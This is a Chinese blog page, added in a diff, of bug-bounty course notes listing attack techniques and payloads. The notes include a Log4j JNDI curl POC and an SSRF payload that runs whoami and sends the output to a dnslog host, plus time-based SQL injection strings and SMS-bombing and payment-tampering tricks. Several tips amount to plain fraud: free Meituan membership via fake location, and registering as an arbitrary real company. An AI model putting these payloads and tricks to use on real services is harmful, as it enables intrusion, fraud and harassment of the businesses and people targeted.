@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-hacker.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-hacker.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-hacker.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":false,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言课程内部月度分享。SRC内容补充，其它关于护网逆向的内容就再看一遍课好了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SRC_cource_14">
+<meta property="og:url" content="http://example.com/2023/12/22/SRC_cource_14/index.html">
+<meta property="og:site_name" content="Scammer">
+<meta property="og:description" content="前言课程内部月度分享。SRC内容补充，其它关于护网逆向的内容就再看一遍课好了。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-12-21T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-12-22T13:40:03.308Z">
+<meta property="article:author" content="Bron">
+<meta property="article:tag" content="SRC">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2023/12/22/SRC_cource_14/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+<link rel="stylesheet" type="text/css" href="/css/injector/main.css" /><link rel="preload" as="style" href="/css/injector/light.css" /><link rel="preload" as="style" href="/css/injector/dark.css" />
+  <title>SRC_cource_14 | Scammer</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Scammer" type="application/atom+xml">
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#000000;--blockquote-color:#bbb;--link-color:#000000;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#ccc;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#161616;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#8a2be2;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Scammer</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">60</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">81</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">196</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/22/SRC_cource_14/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Elaina.png">
+      <meta itemprop="name" content="Bron">
+      <meta itemprop="description" content="原谅我这一生不羁放纵爱自由">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Scammer">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SRC_cource_14
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-12-22 00:00:00 / 修改时间：21:40:03" itemprop="dateCreated datePublished" datetime="2023-12-22T00:00:00+08:00">2023-12-22</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SRC/" itemprop="url" rel="index"><span itemprop="name">SRC</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>课程内部月度分享。SRC内容补充，其它关于护网逆向的内容就再看一遍课好了。</p>
+<span id="more"></span>
+<h1 id="常见的ueditor"><a href="#常见的ueditor" class="headerlink" title="常见的ueditor"></a>常见的ueditor</h1><p>常见目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/ueditorutf8</span><br><span class="line">/ueditor</span><br><span class="line">/static/ueditor</span><br></pre></td></tr></table></figure>
+
+<p>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.xxx.com/ueditorutf8/net/controller.ashx?action=config</span><br><span class="line">https://www.xxx.com/ueditorutf8/net/controller.ashx?action=catchimage</span><br><span class="line">参考url：https://www.cnblogs.com/hei-zi/p/13394764.html</span><br></pre></td></tr></table></figure>
+
+<h1 id="VmwareHorizonClient-log4j"><a href="#VmwareHorizonClient-log4j" class="headerlink" title="VmwareHorizonClient log4j"></a>VmwareHorizonClient log4j</h1><p>POC:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -vv -H &quot;Accept-Language: \$&#123;jndl:ldap://j9qf9g.dnslog.cn:1207/lol&#125;&quot; --insecure https://xx.com</span><br></pre></td></tr></table></figure>
+
+<p>查看dnslog有无回显，有回显则说明存在漏洞</p>
+<h1 id="cas认证"><a href="#cas认证" class="headerlink" title="cas认证"></a>cas认证</h1><p>比如一些swaggerUI的接口，在swaggerUI中发包，返回无法获取<br>或者一些在Findsomething中找到一些接口，访问发现未经认证<br>就可以找认证服务，如sso和cas<br>其中cas可以爆破<br>Authorization: Basic base64<br>可以使用burp进行爆破<br>4版本可以rce</p>
+<p>SSO平台</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/public/pages/login/index.html?backurl=http://xxx.com/Account/Login/ReturnUrl=/&amp;app=test</span><br><span class="line">替换为</span><br><span class="line">http://xxx.com/public/pages/login/index.html?backurl=http://替换.com/Account/Login/ReturnUrl=/&amp;app=test</span><br></pre></td></tr></table></figure>
+
+<h1 id="美团虚拟地址白嫖会员"><a href="#美团虚拟地址白嫖会员" class="headerlink" title="美团虚拟地址白嫖会员"></a>美团虚拟地址白嫖会员</h1><p>用虚拟地址更改定位。</p>
+<h1 id="安卓客户端漏洞"><a href="#安卓客户端漏洞" class="headerlink" title="安卓客户端漏洞"></a>安卓客户端漏洞</h1><ol>
+<li><p>使用drozer对 xx app Android版进行扫描，执行以下命令，获取APP导出组件<br><code>run app.activity.info -a ddns.android.vuls</code></p>
+</li>
+<li><p>通过分析，发现调用相机功能的组件 <code>com.xx.xx.xx.CameraActivity</code> 被导出<br>执行以下命令可直接调用相机权限，打开相机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component com.xx.xx</span><br><span class="line">com.xx.xx.xx.CameraActivity</span><br></pre></td></tr></table></figure>
+<p>…后续省略，详见课程</p>
+</li>
+</ol>
+<p>原理：不具备某一权限的恶意app，通过调用第三方app（该app含有某权限漏洞），进行权限申请操作。实现从无权限到有权限的过程。</p>
+<p>开源安卓APP漏洞案例详情<br><code>https://securitylab.github.com/advisories/GHSL-2021-1033_Nextcloud_News_for_Android</code></p>
+<h2 id="APP渗透测试比web多的部分"><a href="#APP渗透测试比web多的部分" class="headerlink" title="APP渗透测试比web多的部分"></a>APP渗透测试比web多的部分</h2><ol>
+<li><p>环境检测对抗<br>magisk + lsposed<br><code>https://mp.weixin.qq.com/s/oQau4pqXUfn2Wryo7vXGRQ</code><br>(建议使用真手机测试，二手买一个)</p>
+</li>
+<li><p>抓包对抗（代理检测型）<br><code>https://mp.weixin.qq.com/s/DoCxqBTIGWzFR9eETOLzJQ</code><br>代理工具：iptables, proxifier, postern, stream<br>不走代理（通过代码逻辑实现）</p>
+</li>
+</ol>
+<p>安卓7.0以下，直接导入burp证书是安装在用户目录，被信任。<br>安卓7.0以上，证书默认不被信任。解决方法：将证书移动到系统根目录。</p>
+<p>绕过方式：<br>单向证书校验：justtrustme（基于lsposed）, frida脚本<br>双向证书校验：r0caputre, hooker, 定制rom，直接反编译源码</p>
+<p>body乱码 –&gt; gzip –&gt;基于hook抓包 –&gt; frida</p>
+<ol start="3">
+<li>加解密对抗<br>frida –&gt; r0tracer, objection<br>xposed –&gt; lnspeckage<br>直接逆向获取源码 –&gt; 脱壳</li>
+</ol>
+<h1 id="登录接口的暴力破解"><a href="#登录接口的暴力破解" class="headerlink" title="登录接口的暴力破解"></a>登录接口的暴力破解</h1><p>描述：登录接口用户名和密码都进行了加密处理，经过测试发现没有进行次数限制和验证码处理逻辑，因此这里有暴力破解漏洞。<br>加密算法：通过前端JS进行分析得出为：DES Pkcs7 加密算法<br>牛刀：实现DES加密的算法，对字典进行加密，使用密文进行批量枚举</p>
+<h1 id="订单越权-amp-邮件地址IDOR"><a href="#订单越权-amp-邮件地址IDOR" class="headerlink" title="订单越权&amp;邮件地址IDOR"></a>订单越权&amp;邮件地址IDOR</h1><p>描述：好多业务都有报告导出的功能<br>POST请求的数据包体</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Orderid=123&amp;Type=.pdf&amp;DownType=email&amp;Email=xxx@xxx.com</span><br></pre></td></tr></table></figure>
+
+<p>正常逻辑：订单号对应到具体的人，这个人后台设置了绑定的邮箱，因此只能推送到该用户的邮箱才对，也即订单号&amp;邮箱地址绑定的逻辑。</p>
+<p>漏洞：未校验orderid，绑定关系</p>
+<h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><p>描述：漏洞存在于订单预览的页面，请求如下：<br><code>https://app.example.com/OrderDialog/DataEntry?orderId=2004140011&amp;IsShanghaiVolkswagen=0&amp;type=view</code><br>一般这种请求就分析：订单号枚举越权&amp;SQL注入漏洞<br>payloads:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&quot; or sleep(5)=&quot;</span><br><span class="line">&#x27; or sleep(5)=&#x27;</span><br><span class="line">1) or sleep(5)#</span><br><span class="line">&quot;) or sleep(5)&quot;</span><br><span class="line">&#x27;) or sleep(5)&#x27;</span><br><span class="line">1)) or sleep(5)#</span><br><span class="line">&quot;)) or sleep(5)=&quot;</span><br><span class="line">&#x27;)) or sleep(5)=&#x27;</span><br><span class="line">;waitfor delay &#x27;0:0:5&#x27;--</span><br><span class="line">);waitfor delay &#x27;0:0:5&#x27;--</span><br></pre></td></tr></table></figure>
+<p>sqlmap跑</p>
+<h1 id="加密算法bypass"><a href="#加密算法bypass" class="headerlink" title="加密算法bypass"></a>加密算法bypass</h1><p>描述：订单预览的界面，发现订单号加密了，其加密算法为对称加密，无法获取密钥，也就无法解密。<br>请求：<br><code>https://app.example.com/DataEntry/OrderView?orderId=QUdjalfaljDSAFOjwdoiad</code></p>
+<p>经过分析请求数据包发现加密接口<br><code>https://sapp.example.com/Common/EncryptText?text=2004140008</code></p>
+<p>推测：该功能应该是为了防止通过订单号枚举越权访问而采用的安全措施。</p>
+<h1 id="Js-map文件到越权漏洞"><a href="#Js-map文件到越权漏洞" class="headerlink" title="Js.map文件到越权漏洞"></a>Js.map文件到越权漏洞</h1><p>描述：后端程序对请求包体进行了签名校验，因此更改任何数据包都会导致签名校验失败</p>
+<p>webpack打包：<code>https://app.example.com/app.js.map</code><br>源代码还原： <code># reverse-sourcemap --output-dir test app.js.map</code></p>
+<h1 id="验证码绕过到任意-手机-x2F-邮箱轰炸"><a href="#验证码绕过到任意-手机-x2F-邮箱轰炸" class="headerlink" title="验证码绕过到任意-手机&#x2F;邮箱轰炸"></a>验证码绕过到任意-手机&#x2F;邮箱轰炸</h1><p>描述：每次触发验证码都触发图形验证码逻辑</p>
+<p>删除头部的 <code>&quot;x&quot;:114</code> 元素即可批量发送</p>
+<h1 id="信息泄露到OSS-Bucket接管"><a href="#信息泄露到OSS-Bucket接管" class="headerlink" title="信息泄露到OSS Bucket接管"></a>信息泄露到OSS Bucket接管</h1><p>描述：请求包返回加密的云凭证信息</p>
+<h1 id="不一样的任意用户"><a href="#不一样的任意用户" class="headerlink" title="不一样的任意用户"></a>不一样的任意用户</h1><p>描述：用户注册，用户登录验证码本地回显[adb logcat 抓取触发验证码]</p>
+<p>破解方法：验证码发到app里，在burp中无法抓包</p>
+<h1 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h1><p>小程序抓包，购买参数，将数量改为小数，总价变少</p>
+<h1 id="SSRF-RCE"><a href="#SSRF-RCE" class="headerlink" title="SSRF+RCE"></a>SSRF+RCE</h1><p>利用技巧： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com?url=http://`whoami`.teibgj.dnslog.cn</span><br></pre></td></tr></table></figure>
+<p>先执行 <code>whoami</code> 命令，再执行ping命令，优先级前者高。</p>
+<h1 id="二次注入绕过"><a href="#二次注入绕过" class="headerlink" title="二次注入绕过"></a>二次注入绕过</h1><p>在用户名或手机号后加空格，即使账号存在重名也可能能注册成功。<br>示例：<br>账号： <code>admin </code><br>手机号： <code>15300000000 </code></p>
+<h1 id="更改文件类型解析"><a href="#更改文件类型解析" class="headerlink" title="更改文件类型解析"></a>更改文件类型解析</h1><p>场景：原本只允许解析pdf文件<br>修改：将文件内容和后缀改为html</p>
+<h1 id="微信小程序反编译"><a href="#微信小程序反编译" class="headerlink" title="微信小程序反编译"></a>微信小程序反编译</h1><p>首先找到微信小程序，在 设置-文件管理 找到小程序文件。<br>解密工具：</p>
+<ol>
+<li>使用 PC微信小程序一键解密 By:代码果 工具</li>
+<li>wxapkgconvertor</li>
+<li>小锦哥小程序工具（全部集成）</li>
+</ol>
+<h1 id="众测项目"><a href="#众测项目" class="headerlink" title="众测项目"></a>众测项目</h1><h2 id="众测项目特点"><a href="#众测项目特点" class="headerlink" title="众测项目特点"></a>众测项目特点</h2><ol>
+<li>项目周期短 - 基本为3-30天</li>
+<li>奖金相对丰厚 - 最低标准（低危100，中危500，高危1000）</li>
+<li>项目难度低，资产多（基础漏洞多）</li>
+<li>竞争激烈 - 大项目基本上为多家竞测</li>
+<li>金融项目较多，国有银行+股份制银行+城商、农商行+各大证券</li>
+</ol>
+<h2 id="项目分类"><a href="#项目分类" class="headerlink" title="项目分类"></a>项目分类</h2><ol>
+<li>有测试范围的众测 - 从测试范围找脆弱资产</li>
+<li>全互联网资产的众测 - 外包系统-&gt;小程序-&gt;公众号-&gt;主域名系统-&gt;APP</li>
+<li>红队项目众测 - 不建议投入大量精力</li>
+<li>每个月都有的特定目标众测 - 不建议参加</li>
+</ol>
+<h2 id="寻找外包系统"><a href="#寻找外包系统" class="headerlink" title="寻找外包系统"></a>寻找外包系统</h2><p>以邮储银行为例，对目标进行命名分析：</p>
+<ol>
+<li>中国邮政储蓄银行</li>
+<li>邮储银行</li>
+<li>邮储</li>
+<li>邮政储蓄银行</li>
+<li>邮政储蓄</li>
+<li>英文缩写：1、POSTAL SAVINGS BANK OF CHINA 2、psbc</li>
+<li>中文缩写：1、 youchu 2、ycyh 3、yzcxyh 4、yzcx</li>
+</ol>
+<p>语法：</p>
+<ol>
+<li>title</li>
+<li>domain</li>
+<li>body</li>
+</ol>
+<h2 id="hunter使用技巧"><a href="#hunter使用技巧" class="headerlink" title="hunter使用技巧"></a>hunter使用技巧</h2><ol>
+<li>默认列出一个月，改为一年</li>
+<li>有些没有站点标题的也要点进去看，可能有东西</li>
+<li>有些时候可以排除香港台湾</li>
+<li>筛选出国家可获得更精准数据</li>
+<li>可从域名排名和icon排名排除掉大量目标外的站点</li>
+<li>使用此语法可快速模糊搜索出邮储的外包系统: <code>domain=&quot;psbc&quot; and domain!=&quot;psbc.com&quot;</code></li>
+</ol>
+<h2 id="基于调用hunter和fofa，省去了点击IP的步骤-小工具"><a href="#基于调用hunter和fofa，省去了点击IP的步骤-小工具" class="headerlink" title="基于调用hunter和fofa，省去了点击IP的步骤 小工具"></a>基于调用hunter和fofa，省去了点击IP的步骤 小工具</h2><p><code>https://github.com/0x727/Space_view</code></p>
+<h2 id="指纹识别快速getshell"><a href="#指纹识别快速getshell" class="headerlink" title="指纹识别快速getshell"></a>指纹识别快速getshell</h2><p>使用语法搜索-导出下载-指纹识别-过滤<br>指纹识别: <code>https://github.com/0x727/ObserverWard</code><br>命令: <code>observer_ward.exe -f dom.txt -c dom.csv</code></p>
+<h1 id="订单-支付漏洞"><a href="#订单-支付漏洞" class="headerlink" title="订单-支付漏洞"></a>订单-支付漏洞</h1><ol>
+<li>订单id与账号没有绑定，替换订单id购买便宜内容</li>
+<li>订单无过期，生成多个订单</li>
+<li>在订单id中找到订单价格为0的订单id，替换购买，无支付页面显示，直接完成订单</li>
+</ol>
+<h1 id="注册漏洞"><a href="#注册漏洞" class="headerlink" title="注册漏洞"></a>注册漏洞</h1><p>场景：<br>企业注册<br>需要填写企业名称，统一信用代码，手机号，登录密码，确认密码，图形验证码，短信验证码。</p>
+<p>在网上随便找一家公司，填入企业名称和统一信用代码，手机号和密码自己填。登录进入后是一个企业内部账号，手机号不是自己的。</p>
+<h1 id="利用加密越权"><a href="#利用加密越权" class="headerlink" title="利用加密越权"></a>利用加密越权</h1><p>场景：<br>请求包和返回包中都有vendorCode，请求包的是加密的，返回包的是解密的。<br>有上传附件功能，在请求包中有fileRelatId，发现fileRelatId和vendorCode加密很像</p>
+<p>利用方式：利用fileRelatId，在返回包中找到未加密的fileRelatId，将其改为自己想加密的内容，然后加密出自己想要的vendorCode。</p>
+<h1 id="隐藏参数越权"><a href="#隐藏参数越权" class="headerlink" title="隐藏参数越权"></a>隐藏参数越权</h1><p>场景：<br>注册，抓包，有userId, mobile等各种注册信息。</p>
+<p>利用方式：将uid置空，出现隐藏参数。返回包显示“uid，mobile和userid不能同时为空”。由于请求包中无mobile参数，于是将请求包中的uid参数删除，改为mobile参数，手机号使用企业内部手机号。</p>
+<p>因为公司内部手机号是批量给员工发的，所以对员工手机号的后3位进行爆破。得到大量注册信息。</p>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>发现url中存在ueditor，利用nday找到编辑器漏洞SSRF即可。</p>
+<h1 id="隐藏接口越权"><a href="#隐藏接口越权" class="headerlink" title="隐藏接口越权"></a>隐藏接口越权</h1><p>使用findsomething<br>找到空页面，抓包发现有查询字段，查询接口可以使用，即可越权。</p>
+<h1 id="凌风云百度网盘"><a href="#凌风云百度网盘" class="headerlink" title="凌风云百度网盘"></a>凌风云百度网盘</h1><p>搜索出信息泄露，比如: 京东 合同，小米 合同<br>修复建议：以官方身份给百度网盘发邮件，删除内容。</p>
+<h1 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="短信轰炸"></a>短信轰炸</h1><p>最后再测，以免手机号废掉。<br>payload：抓包在手机号后面加“,1” “+” 之类的。</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>我很可爱，请给我钱</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Bron
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2023/12/22/SRC_cource_14/" title="SRC_cource_14">http://example.com/2023/12/22/SRC_cource_14/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/Elaina_Anime">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/SelfEnglishWords">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/SRC/" rel="tag"><i class="fa fa-tag"></i> SRC</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/12/19/SRC_course_13/" rel="prev" title="SRC_course_13">
+      <i class="fa fa-chevron-left"></i> SRC_course_13
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84ueditor"><span class="nav-number">2.</span> <span class="nav-text">常见的ueditor</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#VmwareHorizonClient-log4j"><span class="nav-number">3.</span> <span class="nav-text">VmwareHorizonClient log4j</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cas%E8%AE%A4%E8%AF%81"><span class="nav-number">4.</span> <span class="nav-text">cas认证</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BE%8E%E5%9B%A2%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%99%BD%E5%AB%96%E4%BC%9A%E5%91%98"><span class="nav-number">5.</span> <span class="nav-text">美团虚拟地址白嫖会员</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%BC%8F%E6%B4%9E"><span class="nav-number">6.</span> <span class="nav-text">安卓客户端漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" 